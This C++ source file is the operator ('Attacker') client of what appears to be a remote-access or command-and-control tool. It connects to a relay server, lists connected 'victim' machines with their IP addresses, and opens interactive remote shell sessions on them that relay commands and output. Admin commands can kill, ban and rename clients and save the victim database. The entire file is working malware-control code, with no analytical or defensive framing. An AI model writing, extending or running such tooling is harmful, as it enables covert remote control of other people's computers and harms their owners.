#include "attacker.hpp"
#include <sstream>
#include <conio.h>

static constexpr uint32_t hash(const std::string s) noexcept {
	uint32_t hash = 5381;
	for (const char* c = s.c_str(); c < s.c_str() + s.size(); ++c)
		hash = ((hash << 5) + hash) + (unsigned char)*c;
	return hash;
}

Attacker::Attacker(std::string inHId)
	:
	myHId(inHId)
{
	receiveTcpThread = new std::thread([this]() {
		while (true)
			receiveTcp();
		});

	printMsg("\033[32m" + myHId + "> \033[0m");
}

int Attacker::update()
{
	sf::Clock clock;

	while (_kbhit()) {
		int ch = _getch();
		//enter key
		if (ch == 13) {
			consoleMemory << cmdBuffer << "\n";
			std::cout << "\n";

			if (isSshActive) {
				std::stringstream ss(cmdBuffer);
				std::string cmd;
				ss >> cmd;
				//exit ssh session
				if (cmd == "exit") {
					sf::Packet req;
					req << uint16_t(0) << uint8_t(Cmd::END_SSH);
					auto _ = server.send(req);

					isSshActive = false;
					printMsg("\033[32m" + myHId + "> \033[0m");
				}
				//send ssh data
				else {
					sf::Packet req;
					req << uint16_t(0) << uint8_t(Cmd::SSH_DATA) << cmdBuffer;
					auto _ = server.send(req);
				}
			}
			else if (!handleCmd(cmdBuffer))
				return 1;

			cmdBuffer.clear();
		}
		//backspace
		else if (ch == 8) { 
			if (!cmdBuffer.empty()) {
				cmdBuffer.pop_back();

				system("cls");
				std::cout << listMemory.str() << consoleMemory.str() << cmdBuffer;
			}
		}
		//arrow or special key
		else if (ch == 0 || ch == 224) {
			int arrow = _getch();
			//left
			if (arrow == 75) {

			}
			//right
			else if (arrow == 77) {

			}
			//up
			else if (arrow == 72) {

			}
			//down
			else if (arrow == 80) {

			}
		}
		//normal character
		else if (isprint(ch)) {
			cmdBuffer += static_cast<char>(ch);
			std::cout << static_cast<char>(ch);
		}
	}
	
	if (std::cin.eof())
		return 0;
	
	while (packetsToProcess.size() > 0) {
		handlePacket(packetsToProcess[0]);
		packetsToProcess.erase(packetsToProcess.begin());
	}
	
	if (wasDisconnected) {
		wasDisconnected = false;
		listMemory = std::stringstream();

		consoleMemory << cmdBuffer;
		cmdBuffer.clear();
		printErr(" [disconnected from server]\n");
		printMsg("\033[32m" + myHId + "> \033[0m");

		system("cls");
		std::cout << consoleMemory.str();
	}

	//set to ~100 fps
	auto passed = clock.getElapsedTime().asMicroseconds();
	if (passed < 10'000) 
		sf::sleep(sf::microseconds(10'000 - passed));

	return 0;
}

void Attacker::receiveTcp()
{
	sf::Packet p;
	auto status = server.receive(p);
	//update initialization status
	if (status == sf::Socket::Status::Disconnected) {
		if (isInitialized) {
			isInitialized = false;
			isAdmin = false;
			isSshActive = false;
			wasDisconnected = true;
		}
		sf::sleep(sf::milliseconds(100));
	}
	if (status != sf::Socket::Status::Done)
		return;

	uint16_t reqId;
	p >> reqId;

	if (reqId == uint16_t(0))
		packetsToProcess.push_back(p);
	else
		responsesToProcess[reqId] = p;
}

void Attacker::connectServer(std::stringstream& ss, bool pw)
{
	listMemory = std::stringstream();
	isInitialized = false;
	isAdmin = false;
	isSshActive = false;
	server.disconnect();

	system("cls");
	std::cout << consoleMemory.str();

	std::string ipStr;
	short port = 0;
	ss >> ipStr >> port;
	if (port == 0)
		port = 443;

	//retrieve the ip and port from the interface string
	//if no port is provided, default to 443
	if (ipStr.find_first_of(':') != std::string::npos) {
		auto pos = ipStr.find_first_of(':');
		try {
			port = std::stoi(ipStr.substr(pos + 1));
		}
		catch (const std::invalid_argument&) {
			printErr("port provided is not valid\n");
			return;
		}
		ipStr = ipStr.substr(0, pos);
	}

	//parse the ip address
	auto ip = sf::IpAddress::resolve(ipStr);
	if (!ip.has_value()) {
		printErr("ip address provided is not valid\n");
		return;
	}
	serverIp = ip.value();

	//connect to the server
	if (server.connect(serverIp, port) != sf::Socket::Status::Done) {
		printErr("failed to connect to server\n");
		return;
	}

	//take password input from the user (if admin)
	std::string password = "";
	if (pw) {
		printMsg("enter the password: ");
		while (true) {
			int lastChar = getch();
			if (lastChar == 13) {
				printMsg("\n");
				break;
			}
			if (lastChar == 8 && !password.empty()) {
				password = password.substr(0, password.length() - 1);
				printMsg("\b \b");
			}
			else if (lastChar >= 33 && lastChar <= 125) {
				password += char(lastChar);
				printMsg("*");
			}
		}
	}

	//send the registration request
	sf::Packet req;
	uint16_t reqId = requestId++;
	auto cmd = (pw) ? Cmd::REGISTER_ADMIN : Cmd::REGISTER_ATTACKER;
	req << reqId << std::uint8_t(cmd) << myHId;
	if (pw)
		req << password;
	if (server.send(req) != sf::Socket::Status::Done) {
		printErr("failed to send registration request\n");
		server.disconnect();
		return;
	}

	//wait for initialization response and output progress
	printMsg("waiting for response: [");
	for (int i = 0; i < 10; i++) {
		if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
			sf::sleep(sf::milliseconds(500));
			printMsg("*");
		}
		else
			printMsg(".");
	}
	printMsg("] - ");

	//initialization wasn't successful
	if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
		printErr("timed out\n");
		server.disconnect();
		return;
	}
	
	sf::Packet res = responsesToProcess[reqId];
	responsesToProcess.erase(reqId);

	bool success = false;
	res >> success;
	if (!success) {
		if (pw)
			printErr("failed admin login\n");
		else
			printErr("you are banned :(\n");
		server.disconnect();
		return;
	}

	res >> myId;
	isInitialized = true;
	isAdmin = pw;

	if (pw)
		printMsg("admin access granted (" + std::to_string(myId) + ")\n");
	else
		printMsg("initialized (" + std::to_string(myId) + ")\n");
}

bool Attacker::handleCmd(const std::string& s)
{
	std::stringstream ss(s);
	std::string cmd;
	ss >> cmd;

	switch (hash(cmd)) {
	case hash("exit"): {
		return false;
		break;
	}
	case hash("clear"): {
		consoleMemory = std::stringstream();
		system("cls");
		std::cout << listMemory.str();
		break;
	}
	case hash("connect"): {
		connectServer(ss, false);
		break;
	}
	case hash("adminconnect"): {
		connectServer(ss, true);
		break;
	}
	case hash("name"): {
		if (!isInitialized) {
			printErr("client is not initialized\n");
			break;
		}
		else if (!isAdmin) {
			printErr("admin privileges are needed\n");
			break;
		}

		std::string oHId, name;
		ss >> oHId >> name;
		if (oHId.empty() || name.empty()) {
			printErr("invalid arguments\n");
			break;
		}

		sf::Packet req;
		req << uint16_t(0) << uint8_t(Cmd::CHANGE_NAME) << oHId << name;
		if (server.send(req) != sf::Socket::Status::Done)
			printErr("failed to send request to server\n");
		break;
	}
	case hash("ban"): {
		if (!isInitialized) {
			printErr("client is not initialized\n");
			break;
		}
		else if (!isAdmin) {
			printErr("admin privileges are needed\n");
			break;
		}

		std::string oHId;
		ss >> oHId;
		if (oHId.empty()) {
			printErr("invalid arguments\n");
			break;
		}

		sf::Packet req;
		req << uint16_t(0) << uint8_t(Cmd::BAN_HID) << oHId;
		if (server.send(req) != sf::Socket::Status::Done)
			printErr("failed to send request to server\n");
		break;
	}
	case hash("unban"): {
		if (!isInitialized) {
			printErr("client is not initialized\n");
			break;
		}
		else if (!isAdmin) {
			printErr("admin privileges are needed\n");
			break;
		}

		std::string oHId;
		ss >> oHId;
		if (oHId.empty()) {
			printErr("invalid arguments\n");
			break;
		}

		sf::Packet req;
		req << uint16_t(0) << uint8_t(Cmd::UNBAN_HID) << oHId;
		if (server.send(req) != sf::Socket::Status::Done)
			printErr("failed to send request to server\n");
		break;
	}
	case hash("kill"): {
		if (!isInitialized) {
			printErr("client is not initialized\n");
			break;
		}
		else if (!isAdmin) {
			printErr("admin privileges are needed\n");
			break;
		}

		uint16_t oId = uint16_t(0);
		ss >> oId;
		if (oId == uint16_t(0)) {
			printErr("invalid arguments\n");
			break;
		}

		sf::Packet req;
		req << uint16_t(0) << uint8_t(Cmd::KILL) << oId;
		if (server.send(req) != sf::Socket::Status::Done)
			printErr("failed to send request to server\n");
		break;
	}
	case hash("ssh"): {
		if (!isInitialized) {
			printErr("client is not initialized\n");
			break;
		}

		uint16_t oId = uint16_t(0);
		ss >> oId;
		if (oId == uint16_t(0)) {
			printErr("invalid arguments\n");
			break;
		}

		sf::Packet req;
		uint16_t reqId = requestId++;
		req << uint16_t(reqId) << uint8_t(Cmd::START_SSH) << oId;
		if (server.send(req) != sf::Socket::Status::Done)
			printErr("failed to send request to server\n");

		printMsg("waiting for response: [");
		for (int i = 0; i < 10; i++) {
			if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
				printMsg("*");
				sf::sleep(sf::milliseconds(500));
			}
			else
				printMsg(".");
		}
		printMsg("] - ");

		if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
			printErr("timed out\n");
			break;
		}

		sf::Packet res = responsesToProcess[reqId];
		responsesToProcess.erase(reqId);

		//1 = success, 2 = already paired, 3 = invalid id
		//4 = other id already paired
		uint8_t code = 0;
		res >> code;
		if (code == 1) {
			printMsg("loading ssh session\n");
			isSshActive = true;
		}
		else if (code == 2)
			printErr("ssh session already active\n");
		else if (code == 3)
			printErr("invalid victim id\n");
		else if (code == 4)
			printErr("victim occupied\n");
		else
			printErr("unknown error\n");

		break;
	}
	case hash("save"): {
		if (!isInitialized) {
			printErr("client is not initialized\n");
			break;
		}
		else if (!isAdmin) {
			printErr("admin privileges are needed\n");
			break;
		}

		sf::Packet req;
		uint16_t reqId = requestId++;
		req << uint16_t(reqId) << uint8_t(Cmd::SAVE_DATASET);
		if (server.send(req) != sf::Socket::Status::Done)
			printErr("failed to send request to server\n");

		printMsg("waiting for response: [");
		for (int i = 0; i < 10; i++) {
			if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
				printMsg("*");
				sf::sleep(sf::milliseconds(500));
			}
			else
				printMsg(".");
		}
		printMsg("] - ");

		if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
			printErr("request timed out\n");
			break;
		}
		else
			printMsg("saved database\n");

		break;
	}
	case hash(""): break;
	default: {
		printErr("enter a valid command\n");
		break;
	}
	}

	if (!isSshActive)
		printMsg("\033[32m" + myHId + "> \033[0m");

	return true;
}

void Attacker::handlePacket(sf::Packet& p)
{	
	uint8_t cmd;
	p >> cmd;

	if (cmd == uint8_t(Cmd::LIST_UPDATE))
		updateList(p);
	else if (cmd == uint8_t(Cmd::END_SSH)) {
		isSshActive = false;
		printMsg("\n\033[32m" + myHId + "> \033[0m");
	}
	else if (cmd == uint8_t(Cmd::SSH_DATA)) {
		if (!isSshActive)
			return;

		std::string data;
		p >> data;
		printMsg("\033[33m" + data + "\033[0m");
	}
}

void Attacker::updateList(sf::Packet& p)
{
	listMemory = std::stringstream();
	listMemory << "\033[36m";
	uint16_t dbSize, clientsSize;

	p >> dbSize;
	//database is only sent to admins
	if (dbSize > 0) {
		listMemory << "DATABASE:\n";
		for (int i = 0; i < dbSize; i++) {
			std::string oHId = "", name = "";
			bool ban = false;
			p >> oHId >> name >> ban;
			listMemory << " - " << oHId << " (" << name << "): ";
			if (ban)
				listMemory << "banned\n";
			else
				listMemory << "not banned\n";
		}
		listMemory << "\n";
	}

	p >> clientsSize;
	listMemory << "CLIENTS:\n";
	for (int i = 0; i < clientsSize; i++) {
		std::string oHId = "", ip = "";
		uint16_t id = 0;
		bool att = false, adm = false;
		p >> oHId >> ip >> id >> att >> adm;

		listMemory << " - " << oHId << " (" << id << "): ";
		if (adm)
			listMemory << "admin - " << ip;
		else if (att)
			listMemory << "attacker - " << ip;
		else
			listMemory << "victim - " << ip;

		listMemory << "\n";
	}
	listMemory << "\033[0m\n";

	system("cls");
	std::cout << listMemory.str() << consoleMemory.str() << cmdBuffer;
}
